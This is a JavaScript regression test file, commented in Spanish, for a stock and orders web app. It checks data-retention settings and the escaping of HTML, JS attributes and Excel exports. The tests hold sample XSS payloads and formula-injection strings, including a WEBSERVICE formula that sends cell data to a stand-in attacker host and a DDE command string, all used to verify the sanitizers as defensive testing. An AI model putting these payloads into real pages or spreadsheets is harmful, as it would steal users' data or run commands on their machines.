// tests/critical-regressions.test.js
//
// Estas pruebas existen por una razón puntual: los dos bugs más
// graves que se encontraron en este proyecto (el borrado de
// historial en "modo prueba" de 3 minutos, y el XSS por nombres sin
// escapar) eran del tipo que un cambio futuro, sin querer, puede
// volver a introducir — por ejemplo alguien que vuelve a poner un
// valor de prueba, o agrega una pantalla nueva y se olvida de
// escapar un campo. Si eso pasa, estas pruebas deben fallar de
// inmediato, en vez de descubrirse en producción.

const test = require('node:test');
const assert = require('node:assert/strict');
const { readSrc, loadApp } = require('./helpers/load-app');

test('retención de historial: NO debe estar en modo prueba (3 minutos)', () => {
  const historialLogic = readSrc('historial-logic.js');
  const limpiarScript  = readSrc('scripts/limpiar-historial.js');

  // Debe seguir en 30 días en los dos lugares donde se define
  // (valor de producción vigente; antes fue 38 días).
  assert.match(
    historialLogic,
    /Date\.now\(\)\s*-\s*30\s*\*\s*24\s*\*\s*60\s*\*\s*60\s*\*\s*1000/,
    'historial-logic.js: el cutoff de autoCleanOldOrders ya no está en 30 días — revisa que no haya vuelto el valor de prueba'
  );
  assert.match(
    limpiarScript,
    /RETENCION_MS\s*=\s*30\s*\*\s*24\s*\*\s*60\s*\*\s*60\s*\*\s*1000/,
    'scripts/limpiar-historial.js: RETENCION_MS ya no está en 30 días — revisa que no haya vuelto el valor de prueba'
  );

  // Y que NO aparezca el patrón del valor de prueba (3 minutos) activo.
  assert.doesNotMatch(
    limpiarScript,
    /RETENCION_MS\s*=\s*3\s*\*\s*60\s*\*\s*1000/,
    'scripts/limpiar-historial.js: volvió a aparecer el valor de prueba de 3 minutos — esto borraría el historial real'
  );
});

test('escapeHtml neutraliza HTML/JS en nombres de producto, cliente y descripción', () => {
  const { window } = loadApp(['firebase.js']);
  const payload = `<img src=x onerror="window.__pwned = true">`;

  const escaped = window.escapeHtml(payload);
  assert.ok(!escaped.includes('<img'), 'escapeHtml no debe dejar pasar una etiqueta <img> real');
  assert.match(escaped, /&lt;img/, 'escapeHtml debe convertir "<" en "&lt;"');

  // Prueba de fuego: insertarlo tal cual en el DOM (como hace la
  // app) y confirmar que jsdom NO creó una etiqueta <img> real.
  const div = window.document.createElement('div');
  div.innerHTML = `<span class="pc-name">${escaped}</span>`;
  assert.equal(div.querySelectorAll('img').length, 0, 'no debe haberse creado ningún <img> real en el DOM');
  assert.equal(div.textContent.includes('<img'), true, 'el texto visible debe mostrar la etiqueta como texto plano, no ejecutarla');
});

test('escapeJsAttr protege un onclick=\'...\' de un nombre con comillas dobles', () => {
  const { window } = loadApp(['firebase.js']);
  // Un nombre de producto con comilla doble intentando "romper" el atributo
  const malicioso = `Guitarra" onmouseover="window.__pwned = true` ;
  const safe = window.escapeJsAttr(malicioso);

  const div = window.document.createElement('div');
  div.innerHTML = `<button onclick="openEditStock('${safe}')">x</button>`;
  const btn = div.querySelector('button');
  assert.ok(btn, 'el botón debe poder parsearse con un solo atributo onclick');
  // Si el escape falló, el navegador (o jsdom) habría creado un
  // atributo onmouseover independiente a partir de la comilla suelta.
  assert.equal(btn.getAttribute('onmouseover'), null, 'no debe haberse creado un atributo onmouseover inyectado');
});

test('stock.js, pedidos-logic.js, nueva-nota-logic.js e historial-actions.js siguen usando escapeHtml/escapeJsAttr para campos de texto libre', () => {
  // Guardia de regresión más simple y directa: si alguien agrega un
  // nuevo `${p.name}` o `${c.nombre}` sin pasar por escapeHtml en
  // estos archivos, esta prueba debe fallar.
  //
  // Excepciones conocidas y verificadas como seguras (no se
  // insertan en el DOM vía innerHTML, así que no necesitan escape):
  //   - la cadena `search` (p.ej. `${p.code} ${p.name} ${p.category}`)
  //     solo se usa para comparar texto en minúsculas, nunca se renderiza.
  //   - texto dentro de alert(...) es texto plano del navegador, no HTML.
  const files = ['stock.js', 'pedidos-logic.js', 'nueva-nota-logic.js', 'historial-actions.js', 'historial-logic.js', 'import-stock.js', 'import-clientes.js'];
  const riesgo = /\$\{(?!escapeHtml\(|escapeJsAttr\()[a-zA-Z_][\w.]*\.(name|nombre|desc|ciudad|cliente|motivo)\}/;
  const lineaEsSegura = linea =>
    /const\s+search\s*=/.test(linea) ||   // string de búsqueda interna, no se renderiza
    /^\s*alert\(/.test(linea) ||          // texto plano de alert(), no HTML
    /\.value\s*=/.test(linea);            // asignación a .value de un input, el navegador lo trata como texto plano, no HTML

  for (const f of files) {
    const src = readSrc(f);
    const lineasRiesgosas = src
      .split('\n')
      .filter(linea => riesgo.test(linea) && !lineaEsSegura(linea));

    assert.equal(
      lineasRiesgosas.length, 0,
      `${f}: se encontró un campo de texto libre insertado sin escapeHtml/escapeJsAttr:\n` +
      lineasRiesgosas.join('\n') +
      `\nRepite el mismo patrón de XSS que ya se corrigió antes.`
    );
  }
});

test('sanitizeForExcel neutraliza fórmulas en nombres exportados a Excel', () => {
  const { window } = loadApp(['firebase.js']);

  const casosMaliciosos = [
    '=WEBSERVICE("http://malo.com/robar?"&A1)',
    '+cmd|/c calc',
    '-2+3',
    '@SUM(A1:A9)',
  ];
  for (const payload of casosMaliciosos) {
    const safe = window.sanitizeForExcel(payload);
    assert.ok(safe.startsWith("'"), `"${payload}" debería quedar prefijado con ' para no evaluarse como fórmula`);
    assert.equal(safe.slice(1), payload, 'el texto original debe conservarse intacto después del apóstrofe');
  }

  // Un nombre normal no debe modificarse.
  assert.equal(window.sanitizeForExcel('Guitarra acústica'), 'Guitarra acústica');
});

test('las exportaciones a Excel (Stock, Clientes, Historial) pasan los campos de texto por sanitizeForExcel', () => {
  const files = ['stock.js', 'pedidos-logic.js', 'historial-actions.js'];
  for (const f of files) {
    const src = readSrc(f);
    if (!/XLSX\.utils\.aoa_to_sheet/.test(src)) continue;
    assert.doesNotMatch(
      src, /rows\.push\(\[[^\]]*\b(o\.cliente|item\.name|p\.name|c\.nombre)\b(?!\))/,
      `${f}: hay un campo de texto libre insertado en una fila de Excel sin sanitizeForExcel()`
    );
  }
});
